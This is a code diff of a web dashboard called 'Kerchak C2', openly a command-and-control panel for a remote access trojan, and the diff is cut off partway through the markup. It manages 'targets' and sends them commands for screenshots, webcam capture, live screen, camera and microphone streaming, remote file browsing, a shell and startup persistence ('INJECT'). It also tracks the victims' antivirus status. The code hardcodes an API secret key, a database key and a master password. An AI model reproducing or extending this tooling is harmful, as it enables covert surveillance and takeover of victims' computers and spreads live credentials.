@@ -1,215 +1,90 @@
 "use client";
 
 import { useEffect, useState, useRef } from 'react';
-import { supabase } from '@/lib/supabase';
-import { Monitor, Power, RefreshCw, Terminal, Camera, Mic, MessageSquare, Shield, Activity, X, Video, ChevronRight, Folder, Settings, Download, Trash2, FileText, Play, Plus, Save, Upload, Lock, Globe, LogOut, Eye, Radio, Smartphone, Cpu, HardDrive } from 'lucide-react';
+import { createClient } from '@supabase/supabase-js';
+import { 
+  Terminal, Shield, Monitor, Cpu, Globe, Activity, Settings, 
+  Search, HardDrive, Layout, Command, Image as ImageIcon, Video, 
+  Folder, FileText, ChevronRight, Download, Upload, X, RefreshCw, 
+  Trash2, Plus, Star, Palette, Maximize2, MousePointer2, Camera,
+  Layers, Lock, Unlock, Eye, Ghost, Zap, Server, Database, 
+  Wifi, Cpu as CpuIcon, MemoryStick, AlertTriangle, CheckCircle2,
+  ChevronDown, User, LogOut, MoreVertical, Smartphone, Key
+} from 'lucide-react';
 
-interface Computer {
-  id: string;
-  pc_name: string;
-  public_ip: string;
-  status: 'online' | 'offline';
-  startup_enabled: boolean;
-  antivirus: string;
-  last_seen: string;
-}
+// --- CONFIG ---
+const supabase = createClient(
+  "https://erowwdiqlooseyvenesd.supabase.co",
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVyb3d3ZGlxbG9vc2V5dmVuZXNkIiwicm9sZSI6ImVyb3d3ZGlxbG9vc2V5dmVuZXNkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg3MDAzMjEsImV4cCI6MjA5NDI3NjMyMX0.338eEhJ_sTlZ99VqZ7HZ15eUy5DahA6lnSdBX15BTrc"
+);
 
-export default function Dashboard() {
-  // --- 1. STATE HOOKS ---
-  const [computers, setComputers] = useState<Computer[]>([]);
-  const [activeModal, setActiveModal] = useState<'chat' | 'screenshot' | 'webcam' | 'stream' | 'explorer' | 'saved_commands' | 'settings' | null>(null);
-  const [meteredMeeting, setMeteredMeeting] = useState<any>(null);
+export default function KerchakC2() {
+  const [auth, setAuth] = useState(false);
+  const [pass, setPass] = useState("");
+  const [pcs, setPcs] = useState<any[]>([]);
   const [selectedPc, setSelectedPc] = useState<string | null>(null);
   const [selectedPcName, setSelectedPcName] = useState<string | null>(null);
-  const [screenshots, setScreenshots] = useState<string[]>([]);
-  const [zoomedScreenshot, setZoomedScreenshot] = useState<number | null>(null);
-  const [chatMessages, setChatMessages] = useState<{ from: string, text: string }[]>([]);
-  const [chatInput, setChatInput] = useState("");
-  const [activePC, setActivePC] = useState<string | null>(null);
-  const [showTerminal, setShowTerminal] = useState(false);
-  const [terminalOutput, setTerminalOutput] = useState<string[]>(["Kerchak OS [Version 3.0.0]", "(c) 2026 Kerchak Corporation. All rights reserved.", ""]);
-  const [terminalInput, setTerminalInput] = useState("");
-  const [streamMode, setStreamMode] = useState<'screen' | 'webcam' | 'mic'>('screen');
-  const [availableDevices, setAvailableDevices] = useState<{cameras: any[], mics: any[]}>({cameras: [], mics: []});
-  const [selectedCamera, setSelectedCamera] = useState<string>('');
-  const [selectedMic, setSelectedMic] = useState<string>('');
-  const [isProbing, setIsProbing] = useState(false);
+  const [activeModal, setActiveModal] = useState<'cmd' | 'explorer' | 'screenshot' | 'webcam' | 'stream' | 'shortcuts' | 'settings' | 'info' | null>(null);
+  const [accentColor, setAccentColor] = useState('#ff0000');
   
-  // Customization
-  const [themeColor, setThemeColor] = useState("#dc2626"); // Global Red
+  // Terminal State
+  const [cmdInput, setCmdInput] = useState('');
+  const [cmdHistory, setCmdHistory] = useState<string[]>([]);
   
-  // File Explorer State
+  // Explorer State
   const [explorerPath, setExplorerPath] = useState("C:\\");
-  const [explorerFiles, setExplorerFiles] = useState<{name:string, isDir:boolean, size:number}[]>([]);
+  const [explorerFiles, setExplorerFiles] = useState<any[]>([]);
   const [isExplorerLoading, setIsExplorerLoading] = useState(false);
-
-  // Saved Commands State
-  const [savedCommands, setSavedCommands] = useState<{id:string, name:string, cmd:string, args:string, hasParams:boolean}[]>([]);
-  const [isCreatingCommand, setIsCreatingCommand] = useState(false);
-  const [newCmd, setNewCmd] = useState({name:'', cmd:'', args:'', hasParams:false});
-
-  // Authentication State
-  const [isAuthenticated, setIsAuthenticated] = useState(false);
-  const [passwordInput, setPasswordInput] = useState("");
-  const [isAuthChecking, setIsAuthChecking] = useState(true);
-  const MASTER_PASSWORD = "clack45";
-
-  // Refs
-  const terminalEndRef = useRef<HTMLDivElement>(null);
-
-  // --- 2. EFFECTS ---
   
-  useEffect(() => {
-    if (showTerminal) terminalEndRef.current?.scrollIntoView({ behavior: "smooth" });
-  }, [terminalOutput, showTerminal]);
+  // Media State
+  const [mediaItems, setMediaItems] = useState<any[]>([]);
+  const [isCapturing, setIsCapturing] = useState(false);
+  const [zoomedMedia, setZoomedMedia] = useState<string | null>(null);
+
+  // Saved Commands
+  const [savedCmds, setSavedCmds] = useState<any[]>([]);
+  const [isAddingShortcut, setIsAddingShortcut] = useState(false);
 
   useEffect(() => {
-    const fetchComputers = async () => {
-      let { data } = await supabase.from('computers').select('*');
-      setComputers(data || []);
-    }
-    fetchComputers();
-
-    const sub = supabase.channel('public:computers')
-      .on('postgres_changes', { event: '*', schema: 'public', table: 'computers' }, (payload) => {
-        setComputers((current) => {
-          const newPc = payload.new as Computer;
-          const index = current.findIndex(c => c.id === newPc.id);
-          if (index > -1) {
-            const updated = [...current];
-            updated[index] = newPc;
-            return updated;
-          }
-          return [...current, newPc];
-        });
-      }).subscribe();
-
+    fetchPcs();
+    fetchShortcuts();
+    const sub = supabase.channel('pcs').on('postgres_changes', { event: '*', table: 'computers' }, fetchPcs).subscribe();
     return () => { supabase.removeChannel(sub); };
   }, []);
 
-  useEffect(() => {
-    const auth = localStorage.getItem('kerchak_auth');
-    if (auth === 'true') setIsAuthenticated(true);
-    setIsAuthChecking(false);
-    
-    const saved = localStorage.getItem('kerchak_shortcuts');
-    if (saved) setSavedCommands(JSON.parse(saved));
-    
-    const theme = localStorage.getItem('kerchak_theme');
-    if (theme) setThemeColor(theme);
-  }, []);
-
-  // Metered Logic
-  useEffect(() => {
-    if (activeModal !== 'stream' || !selectedPc) return;
-    const roomName = 'k' + selectedPc.replace(/-/g, '').substring(0, 12);
-    let meeting: any = null;
-    let scriptEl: HTMLScriptElement | null = null;
-    let active = true;
-
-    const load = () => {
-      scriptEl = document.createElement('script');
-      scriptEl.src = 'https://cdn.metered.ca/sdk/video/1.4.6/sdk.min.js';
-      scriptEl.onload = async () => {
-        if (!active) return;
-        // @ts-ignore
-        meeting = new window.Metered.Meeting();
-        setMeteredMeeting(meeting);
-
-        meeting.on('remoteTrackStarted', (item: any) => {
-          const container = document.getElementById('stream-container');
-          if (!container) return;
-          document.getElementById('stream-loading')?.style.setProperty('display', 'none');
-          const stream = new MediaStream([item.track]);
-          if (item.type === 'video') {
-            const v = document.createElement('video') as HTMLVideoElement;
-            v.id = item.streamId;
-            v.autoplay = true;
-            v.playsInline = true;
-            v.srcObject = stream;
-            v.className = 'rounded-2xl border border-white/10 shadow-2xl bg-black object-contain w-full md:w-[48%] max-h-[45vh] cursor-zoom-in transition-all hover:scale-[1.02]';
-            v.onclick = () => {
-              if (v.classList.contains('fixed-zoom')) {
-                v.classList.remove('fixed-zoom');
-                v.style.cssText = '';
-              } else {
-                v.classList.add('fixed-zoom');
-                v.style.cssText = 'position:fixed; top:10%; left:10%; width:80%; height:80%; z-index:100; max-height:none;';
-              }
-            };
-            container.appendChild(v);
-          } else {
-            const a = document.createElement('audio') as HTMLAudioElement;
-            a.id = item.streamId;
-            a.autoplay = true;
-            a.srcObject = stream;
-            container.appendChild(a);
-          }
-        });
-
-        meeting.on('remoteTrackStopped', (item: any) => {
-          document.getElementById(item.streamId)?.remove();
-        });
-
-        try {
-          await meeting.join({ roomURL: `kerchak.metered.live/${roomName}`, name: 'Admin' });
-        } catch(e) { console.error('Metered join failed', e); }
-      };
-      document.body.appendChild(scriptEl);
-    };
-
-    const timer = setTimeout(load, 5000);
-    return () => {
-      active = false;
-      clearTimeout(timer);
-      if (meeting) { try { meeting.leaveMeeting(); } catch(e) {} }
-      if (scriptEl?.parentNode) scriptEl.parentNode.removeChild(scriptEl);
-      setMeteredMeeting(null);
-    };
-  }, [activeModal, selectedPc]);
-
-  // --- 3. FUNCTIONS ---
-
-  const isOnline = (lastSeen: string) => {
-    if (!lastSeen) return false;
-    const last = new Date(lastSeen.endsWith('Z') ? lastSeen : lastSeen + 'Z').getTime();
-    return (new Date().getTime() - last) < 15000;
+  const fetchPcs = async () => {
+    const { data } = await supabase.from('computers').select('*').order('last_seen', { ascending: false });
+    if (data) setPcs(data);
   };
 
-  const takeScreenshot = async (pcId: string) => {
-    setScreenshots([]);
-    const { data } = await supabase.from('commands').insert({ computer_id: pcId, command: 'screenshot', status: 'pending' }).select().single();
-    if (data) {
+  const fetchShortcuts = async () => {
+    const { data } = await supabase.from('saved_commands').select('*');
+    if (data) setSavedCmds(data);
+  };
+
+  const deletePc = async (id: string) => {
+    if (!window.confirm("Permanently delete this endpoint from hive?")) return;
+    await supabase.from('computers').delete().eq('id', id);
+    fetchPcs();
+  };
+
+  const sendCommand = async (pcId: string, type: string, args: string = "") => {
+    const { data } = await supabase.from('commands').insert({ computer_id: pcId, command: type, args, status: 'pending' }).select().single();
+    if (type === 'ss' || type === 'webcam') {
+      setIsCapturing(true);
+      setMediaItems([]);
+      setActiveModal(type === 'ss' ? 'screenshot' : 'webcam');
       const check = setInterval(async () => {
         const { data: res } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
         if (res?.status === 'executed' && res.result) {
-          try {
-            const urls = JSON.parse(res.result);
-            setScreenshots(Array.isArray(urls) ? urls : [urls]);
-          } catch(e) { setScreenshots([res.result]); }
+          setMediaItems(res.result.split('|'));
+          setIsCapturing(false);
           clearInterval(check);
         }
-      }, 1000);
-      setTimeout(() => clearInterval(check), 30000);
+      }, 2000);
+      setTimeout(() => { clearInterval(check); setIsCapturing(false); }, 30000);
     }
-  };
-
-  const startLiveStream = async (pcId: string, pcName: string, mode: 'screen' | 'webcam' | 'mic' = 'screen') => {
-    setSelectedPc(pcId);
-    setSelectedPcName(pcName);
-    setStreamMode(mode);
-    const roomName = 'k' + pcId.replace(/-/g, '').substring(0, 12);
-    try {
-      const secretKey = 'aoGqhdUx0-0GdtuP5zhL6hSDiW8SLRwv80ME3HF_cesDvDrx';
-      await fetch(`https://kerchak.metered.live/api/v1/room?secretKey=${secretKey}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ roomName, privacy: 'public' })
-      });
-    } catch(e) {}
-    const args = `${roomName}|${mode}|${selectedCamera}|${selectedMic}`;
-    await supabase.from('commands').insert({ computer_id: pcId, command: 'stream_start', args, status: 'pending' });
-    setActiveModal('stream');
+    return data;
   };
 
   const fetchFiles = async (path: string) => {
@@ -223,7 +98,7 @@ export default function Dashboard() {
         if (res?.status === 'executed' && res.result) {
           try { 
             const raw = JSON.parse(res.result);
-            setExplorerFiles(raw.map((f:any) => ({ name: f.n, isDir: f.d === 1, size: f.s }))); 
+            setExplorerFiles(raw.map((f: any) => ({ name: f.n, isDir: f.d === 1, size: f.s }))); 
           } catch(e) {}
           setIsExplorerLoading(false);
           clearInterval(check);
@@ -233,183 +108,178 @@ export default function Dashboard() {
     }
   };
 
-  const sendCommand = async (pcId: string, cmd: string, args: string = "") => {
-    await supabase.from('commands').insert({ computer_id: pcId, command: cmd, args, status: 'pending' });
-  };
-
-  const saveCommand = () => {
-    if (!newCmd.name || !newCmd.cmd) return;
-    const cmd = { ...newCmd, id: Math.random().toString(36).substr(2, 9) };
-    const updated = [...savedCommands, cmd];
-    setSavedCommands(updated);
-    localStorage.setItem('kerchak_shortcuts', JSON.stringify(updated));
-    setNewCmd({name:'', cmd:'', args:'', hasParams:false});
-    setIsCreatingCommand(false);
-  };
-
-  const deleteSavedCommand = (id: string) => {
-    const updated = savedCommands.filter(c => c.id !== id);
-    setSavedCommands(updated);
-    localStorage.setItem('kerchak_shortcuts', JSON.stringify(updated));
-  };
-
-  const openExplorer = (id: string, name: string) => {
-    setSelectedPc(id);
-    setSelectedPcName(name);
-    setActiveModal('explorer');
-    fetchFiles("C:\\");
-  };
-
-  const handleLogin = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (passwordInput === MASTER_PASSWORD) {
-      setIsAuthenticated(true);
-      localStorage.setItem('kerchak_auth', 'true');
-    } else {
-      alert("Unauthorized.");
-      setPasswordInput("");
-    }
-  };
-
-  if (isAuthChecking) return <div className="min-h-screen bg-black flex items-center justify-center"><RefreshCw className="text-red-600 animate-spin" size={40} /></div>;
-
-  if (!isAuthenticated) {
+  if (!auth) {
     return (
-      <div className="min-h-screen bg-[#050505] flex items-center justify-center p-6 relative overflow-hidden">
-        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(220,38,38,0.1),transparent)] animate-pulse"></div>
-        <div className="w-full max-w-md bg-[#0c0c0c] border border-red-500/20 p-10 rounded-[2.5rem] shadow-[0_0_100px_rgba(220,38,38,0.15)] relative z-10">
-          <div className="flex flex-col items-center gap-6 mb-10">
-            <div className="w-24 h-24 bg-red-600/10 rounded-3xl border border-red-500/30 flex items-center justify-center shadow-[0_0_50px_rgba(220,38,38,0.2)]">
-              <Shield size={48} className="text-red-500 animate-pulse" />
-            </div>
-            <div className="text-center">
-              <h1 className="text-4xl font-black text-white tracking-tighter uppercase mb-2">Kerchak <span className="text-red-600">Secure</span></h1>
-              <p className="text-gray-500 text-[10px] font-black uppercase tracking-[0.4em] opacity-50">Authorized Personnel Only</p>
-            </div>
+      <div className="min-h-screen bg-[#050505] flex items-center justify-center p-4 font-mono overflow-hidden">
+        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,0,0,0.05),transparent)] pointer-events-none"></div>
+        <div className="w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-2xl p-8 shadow-[0_0_50px_rgba(255,0,0,0.1)] relative z-10 text-center animate-in fade-in zoom-in duration-500">
+          <div className="w-20 h-20 bg-red-600/20 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-500/30">
+            <Ghost className="text-red-500" size={40} />
           </div>
-          <form onSubmit={handleLogin} className="space-y-6">
-            <input type="password" value={passwordInput} onChange={e => setPasswordInput(e.target.value)} autoFocus placeholder="ACCESS KEY" className="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-5 text-center text-white font-mono tracking-[1em] focus:outline-none focus:border-red-600 transition-all placeholder:tracking-widest" />
-            <button type="submit" className="w-full bg-red-600 hover:bg-red-500 text-white font-black py-5 rounded-2xl shadow-[0_0_30px_rgba(220,38,38,0.3)] transition-all active:scale-95 uppercase tracking-widest text-sm">Synchronize</button>
-          </form>
+          <h1 className="text-2xl font-black text-white tracking-tighter mb-2 italic">KERCHAK <span className="text-red-600">ENGINE</span></h1>
+          <p className="text-gray-500 text-xs mb-8 uppercase tracking-[0.2em] font-bold">Encrypted Command & Control</p>
+          <input 
+            type="password" 
+            placeholder="ACCESS KEY" 
+            className="w-full bg-black/50 border border-white/10 rounded-xl px-5 py-4 text-white focus:outline-none focus:border-red-600 transition-all text-center tracking-widest mb-4"
+            value={pass}
+            onChange={e => setPass(e.target.value)}
+            onKeyDown={e => e.key === 'Enter' && pass === 'clack45' && setAuth(true)}
+          />
+          <button 
+            onClick={() => pass === 'clack45' && setAuth(true)}
+            className="w-full bg-red-600 hover:bg-red-500 text-white font-black py-4 rounded-xl transition-all shadow-[0_0_20px_rgba(220,38,38,0.3)] active:scale-95"
+          >
+            INITIALIZE SESSION
+          </button>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-[#050505] text-gray-200 font-sans selection:bg-red-500/30 overflow-x-hidden">
+    <div className="min-h-screen bg-[#050505] text-gray-300 font-sans selection:bg-red-600/30" style={{'--primary': accentColor, '--primary-glow': accentColor + '33'} as any}>
       <style dangerouslySetInnerHTML={{ __html: `
-        @keyframes flow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-        .theme-accent { color: ${themeColor}; }
-        .theme-bg { background-color: ${themeColor}; }
-        .theme-border { border-color: ${themeColor}40; }
-        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
-        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
-        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
+        :root { --primary: ${accentColor}; --primary-glow: ${accentColor}33; }
+        .glow-red { filter: drop-shadow(0 0 10px var(--primary-glow)); }
+        .border-glow:hover { border-color: var(--primary); box-shadow: 0 0 15px var(--primary-glow); }
+        .bg-gradient-premium { background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, transparent 100%); }
       `}} />
 
-      {/* Top Navigation */}
-      <header className="sticky top-0 z-50 border-b border-white/5 bg-black/40 backdrop-blur-2xl">
-        <div className="max-w-[1800px] mx-auto px-10 h-24 flex justify-between items-center">
-          <div className="flex items-center gap-8">
-            <div className="relative group cursor-pointer" onClick={() => setActiveModal('settings')}>
-              <div className="absolute -inset-2 bg-gradient-to-r from-red-600 to-orange-600 rounded-full blur opacity-20 group-hover:opacity-40 transition duration-1000"></div>
-              <Shield size={32} style={{ color: themeColor }} className="relative" />
+      {/* TOP NAV OVERHAUL */}
+      <nav className="h-20 bg-[#080808]/90 backdrop-blur-2xl border-b border-white/5 flex items-center justify-between px-8 sticky top-0 z-[100] shadow-2xl">
+        <div className="flex items-center gap-10">
+          <div className="flex items-center gap-4 cursor-pointer group" onClick={() => window.location.reload()}>
+            <div className="w-12 h-12 bg-primary rounded-2xl flex items-center justify-center rotate-3 group-hover:rotate-0 transition-all shadow-[0_0_25px_var(--primary-glow)] border border-white/10">
+              <Ghost className="text-white" size={28} />
             </div>
             <div>
-              <h1 className="text-2xl font-black tracking-tighter text-white flex items-center gap-3">
-                KERCHAK <span className="bg-white/5 border border-white/10 px-3 py-1 rounded-xl text-[10px] tracking-[0.3em] text-gray-500 font-black">CORE v3</span>
-              </h1>
-              <div className="flex items-center gap-2 mt-1">
-                <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></div>
-                <span className="text-[9px] font-black uppercase tracking-widest text-gray-500">Fleet Operations Control Center</span>
+              <h1 className="text-2xl font-black text-white tracking-tighter italic leading-none">KERCHAK <span className="text-primary tracking-normal not-italic font-bold text-lg">C2</span></h1>
+              <div className="flex items-center gap-2 text-[10px] text-gray-500 font-bold uppercase tracking-widest mt-1">
+                <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
+                Hive Operational
               </div>
             </div>
           </div>
-
-          <div className="flex items-center gap-6">
-            <div className="hidden lg:flex flex-col items-end px-6 border-r border-white/5">
-              <span className="text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5">Systems Monitoring</span>
-              <span className="text-xs font-black text-white">{computers.filter(c => isOnline(c.last_seen)).length} / {computers.length} ACTIVE ENDPOINTS</span>
+          
+          <div className="hidden lg:flex items-center gap-8">
+            <div className="flex flex-col">
+              <span className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Active Targets</span>
+              <span className="text-lg font-black text-white leading-none">{pcs.length}</span>
             </div>
-            <button onClick={() => { localStorage.removeItem('kerchak_auth'); setIsAuthenticated(false); }} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl border border-white/5 text-red-500 transition-all active:scale-95"><LogOut size={20} /></button>
+            <div className="w-px h-8 bg-white/5"></div>
+            <div className="flex flex-col">
+              <span className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Global Status</span>
+              <span className="text-lg font-black text-green-500 leading-none">STEALTH</span>
+            </div>
           </div>
         </div>
-      </header>
 
-      {/* Main Grid */}
-      <main className="max-w-[1800px] mx-auto p-10">
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
-          {computers.map(pc => {
-            const online = isOnline(pc.last_seen);
+        <div className="flex items-center gap-5">
+          <div className="hidden md:flex items-center gap-2 bg-white/5 border border-white/5 px-4 py-2.5 rounded-2xl focus-within:border-primary transition-all group">
+            <Search size={16} className="text-gray-500 group-focus-within:text-primary" />
+            <input type="text" placeholder="Search Endpoint..." className="bg-transparent text-xs font-bold focus:outline-none w-48 placeholder:text-gray-600" />
+          </div>
+          
+          <div className="flex items-center gap-3">
+            <button onClick={() => setActiveModal('shortcuts')} className="p-3 bg-white/5 hover:bg-white/10 rounded-2xl border border-white/5 transition-all text-gray-400 hover:text-primary"><Command size={20} /></button>
+            <button onClick={() => setActiveModal('settings')} className="p-3 bg-white/5 hover:bg-white/10 rounded-2xl border border-white/5 transition-all text-gray-400 hover:text-primary"><Palette size={20} /></button>
+            <div className="w-px h-8 bg-white/5 mx-1"></div>
+            <div className="flex items-center gap-4 bg-white/5 border border-white/5 pl-4 pr-2 py-2 rounded-2xl group hover:border-primary/30 transition-all cursor-pointer">
+              <div className="text-right">
+                <p className="text-[10px] font-black text-primary uppercase leading-none mb-1">Root Admin</p>
+                <p className="text-xs text-white font-bold leading-none">clack45</p>
+              </div>
+              <div className="w-9 h-9 bg-primary/20 rounded-xl flex items-center justify-center text-primary border border-primary/20 group-hover:bg-primary group-hover:text-white transition-all shadow-lg">
+                <User size={20} />
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+
+      <main className="p-8 max-w-[1700px] mx-auto animate-slide-up">
+        {/* STATS STRIP */}
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-12">
+          {[
+            { label: 'Targets', val: pcs.length, icon: Server, color: 'text-primary' },
+            { label: 'Inbound', val: '0.8 MB/s', icon: Wifi, color: 'text-blue-500' },
+            { label: 'CPU Load', val: '4%', icon: CpuIcon, color: 'text-purple-500' },
+            { label: 'RAM Usage', val: '1.2 GB', icon: MemoryStick, color: 'text-orange-500' },
+          ].map((s, i) => (
+            <div key={i} className="glass p-6 rounded-3xl border-white/5 flex items-center justify-between group hover:border-primary/20 transition-all cursor-default">
+              <div>
+                <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-1">{s.label}</p>
+                <p className="text-2xl font-black text-white">{s.val}</p>
+              </div>
+              <div className={`${s.color} bg-white/5 p-4 rounded-2xl group-hover:scale-110 group-hover:rotate-3 transition-all`}><s.icon size={28} /></div>
+            </div>
+          ))}
+        </div>
+
+        <div className="flex items-center justify-between mb-8">
+          <h2 className="text-2xl font-black text-white italic tracking-tighter">DISCOVERED <span className="text-primary">ENDPOINTS</span></h2>
+          <div className="flex items-center gap-3">
+             <div className="flex bg-white/5 p-1 rounded-xl border border-white/5">
+                <button className="px-4 py-1.5 text-[10px] font-black rounded-lg bg-primary text-white shadow-lg">ALL</button>
+                <button className="px-4 py-1.5 text-[10px] font-black rounded-lg text-gray-500 hover:text-white transition-all">WINDOWS</button>
+                <button className="px-4 py-1.5 text-[10px] font-black rounded-lg text-gray-500 hover:text-white transition-all">LINUX</button>
+             </div>
+          </div>
+        </div>
+
+        {/* TARGET CARDS OVERHAUL */}
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
+          {pcs.map(pc => {
+            const isOnline = (Date.now() - new Date(pc.last_seen).getTime()) < 15000;
             return (
-              <div key={pc.id} className="group relative bg-[#0c0c0c] border border-white/5 rounded-[2rem] overflow-hidden transition-all duration-500 hover:border-red-500/40 hover:shadow-[0_0_50px_rgba(220,38,38,0.1)] p-8">
-                <div className="absolute top-0 left-0 w-full h-1.5 bg-white/5 overflow-hidden">
-                  <div className={`h-full transition-all duration-1000 ${online ? 'bg-green-500 shadow-[0_0_10px_#22c55e]' : 'bg-gray-800'}`} style={{ width: online ? '100%' : '20%' }}></div>
-                </div>
-
-                <div className="flex justify-between items-start mb-8">
-                  <div className="flex items-center gap-5">
-                    <div className="p-4 rounded-3xl bg-white/5 border border-white/10 group-hover:bg-red-500/10 group-hover:border-red-500/20 transition-all duration-500">
-                      <Monitor size={28} style={{ color: online ? themeColor : '#444' }} />
+              <div key={pc.id} className="glass rounded-3xl border-white/5 hover:border-primary/30 transition-all group relative overflow-hidden flex flex-col h-full animate-in zoom-in duration-300">
+                <div className={`absolute top-0 inset-x-0 h-1 ${isOnline ? 'bg-green-500 shadow-[0_0_10px_#22c55e]' : 'bg-red-600 shadow-[0_0_10px_#dc2626] animate-pulse'}`}></div>
+                <div className="p-6 pb-4">
+                  <div className="flex justify-between items-start mb-6">
+                    <div className={`w-16 h-16 rounded-2xl flex items-center justify-center bg-white/5 border border-white/5 group-hover:border-primary/20 transition-all ${isOnline ? 'text-primary' : 'text-gray-600'} shadow-inner`}>
+                      <Monitor size={36} className="glow-red" />
                     </div>
-                    <div>
-                      <h2 className="text-lg font-black text-white tracking-tight truncate max-w-[150px] uppercase">{pc.pc_name}</h2>
-                      <div className="flex items-center gap-2 mt-1">
-                        <Globe size={10} className="text-gray-600" />
-                        <span className="text-[10px] font-bold text-gray-600">{pc.public_ip}</span>
-                      </div>
+                    <div className="text-right">
+                       <span className={`text-[9px] font-black px-2 py-1 rounded-md border ${isOnline ? 'bg-green-500/10 text-green-400 border-green-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>
+                         {isOnline ? 'STATUS: ACTIVE' : 'STATUS: OFFLINE'}
+                       </span>
+                       <p className="text-[11px] font-mono font-bold text-gray-600 mt-2">{pc.ip}</p>
                     </div>
                   </div>
-                  <div className={`px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-widest ${online ? 'bg-green-500/10 text-green-500 border border-green-500/20' : 'bg-gray-800/50 text-gray-500 border border-white/5'}`}>
-                    {online ? 'Active' : 'Standby'}
+
+                  <h3 className="text-xl font-black text-white truncate mb-1 group-hover:text-primary transition-colors">{pc.name}</h3>
+                  <div className="flex items-center gap-4 mt-4">
+                    <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-500">
+                      <Cpu size={14} className="text-primary" /> CPU: 4%
+                    </div>
+                    <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-500">
+                      <Database size={14} className="text-blue-400" /> RAM: 1.2GB
+                    </div>
                   </div>
                 </div>
 
-                <div className="space-y-3 mb-8">
-                   <div className="flex items-center justify-between p-4 bg-white/5 rounded-2xl border border-white/5">
-                      <div className="flex items-center gap-3">
-                         <Shield size={16} className="text-blue-500" />
-                         <span className="text-[10px] font-black uppercase tracking-widest text-gray-500">Security</span>
-                      </div>
-                      <span className="text-[10px] font-black text-white truncate max-w-[100px] uppercase">{pc.antivirus || 'VULNERABLE'}</span>
-                   </div>
-                   <div className="flex items-center justify-between p-4 bg-white/5 rounded-2xl border border-white/5">
-                      <div className="flex items-center gap-3">
-                         <Cpu size={16} className="text-purple-500" />
-                         <span className="text-[10px] font-black uppercase tracking-widest text-gray-500">Startup</span>
-                      </div>
-                      <button onClick={() => sendCommand(pc.id, pc.startup_enabled ? 'startup_remove' : 'startup')} className={`text-[10px] font-black uppercase tracking-widest ${pc.startup_enabled ? 'text-green-500' : 'text-gray-600 hover:text-white'}`}>
-                        {pc.startup_enabled ? 'ENABLED' : 'INJECT'}
+                <div className="mt-auto p-6 pt-0">
+                  <div className="grid grid-cols-4 gap-3">
+                    {[
+                      { icon: Terminal, modal: 'cmd', color: 'hover:bg-primary' },
+                      { icon: Folder, modal: 'explorer', color: 'hover:bg-blue-600' },
+                      { icon: ImageIcon, modal: 'screenshot', color: 'hover:bg-purple-600' },
+                      { icon: Video, modal: 'stream', color: 'hover:bg-orange-600' },
+                    ].map((btn, i) => (
+                      <button 
+                        key={i} 
+                        onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.name); setActiveModal(btn.modal as any); if(btn.modal==='explorer') fetchFiles('C:\\'); }}
+                        className={`h-12 bg-white/5 border border-white/5 rounded-2xl flex items-center justify-center text-gray-500 ${btn.color} hover:text-white transition-all active:scale-90 shadow-md group/btn`}
+                      >
+                        <btn.icon size={22} />
                       </button>
-                   </div>
-                </div>
-
-                <div className="grid grid-cols-3 gap-3">
-                  <button onClick={() => openExplorer(pc.id, pc.pc_name)} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
-                    <Folder size={20} className="text-yellow-500 group-hover/btn:scale-110 transition-transform" />
-                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Storage</span>
-                  </button>
-                  <button onClick={() => startLiveStream(pc.id, pc.pc_name)} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
-                    <Video size={20} className="text-red-500 group-hover/btn:scale-110 transition-transform animate-pulse" />
-                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Stream</span>
-                  </button>
-                  <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setActiveModal('screenshot'); takeScreenshot(pc.id); }} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
-                    <Camera size={20} className="text-blue-400 group-hover/btn:scale-110 transition-transform" />
-                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Capture</span>
-                  </button>
-                  <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setActiveModal('chat'); }} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
